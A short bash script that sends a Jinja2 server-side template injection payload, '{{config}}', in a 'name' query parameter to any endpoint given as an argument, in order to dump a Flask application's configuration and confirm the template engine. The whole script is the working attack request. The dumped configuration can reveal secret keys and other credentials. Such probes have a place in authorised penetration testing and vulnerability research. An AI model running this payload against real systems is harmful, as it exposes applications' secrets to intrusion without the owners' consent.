#!/bin/bash
# Flask SSTI — Dump config to confirm Jinja2 engine
# Usage: confirm_jinja2_config.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s -G --data-urlencode "name={{config}}" "$ENDPOINT" --max-time 8
